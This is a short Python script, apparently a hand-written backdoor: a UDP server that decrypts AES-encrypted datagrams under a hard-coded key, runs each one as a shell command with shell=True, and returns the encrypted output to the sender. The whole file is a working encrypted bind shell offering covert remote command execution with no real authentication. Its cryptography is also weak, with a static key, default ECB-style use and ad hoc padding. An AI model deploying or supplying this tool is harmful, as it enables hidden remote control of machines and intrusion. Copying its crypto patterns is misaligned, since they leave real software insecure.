#!/usr/bin/python
'''UDP encrypted commandline server'''

import socket
import subprocess
import sys

if (len(sys.argv) != 3):
    print("UDP server usage: ", sys.argv[0], " ip port")
    print("Example: ", sys.argv[0], "1.2.3.4 9999")
    sys.exit()

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ip   = sys.argv[1]
port = int(sys.argv[2])

# Encryption
from Crypto.Cipher import AES
import base64

# Symetric secret key (must be multiple of 16)
secret = "aaaabbbbccccdddd"

def dx(edata):
    ''' Decyrpt function '''
    PADDING = '{'
    DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).decode("UTF-8").rstrip(PADDING)
    return DecodeAES(AES.new(secret.encode()), edata)

def ex(data):
    ''' Encrypt function '''
    BLOCK_SIZE = 16
    PADDING = '{'
    pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
    EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
    return EncodeAES(AES.new(secret.encode()), data)

def udp_server():
    ''' Concurrent UDP server service '''
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((ip, port))
    print("Listening on port ", port, "... ")

    while 1:
        data, addr = sock.recvfrom(1024)
        mystring = dx(data.decode())
        p = subprocess.Popen(mystring, stdout = subprocess.PIPE, shell=True)
        result, err = p.communicate()
        myresult = ex(result.decode())
        sock.sendto(myresult, addr)

if __name__ == '__main__':
    udp_server()
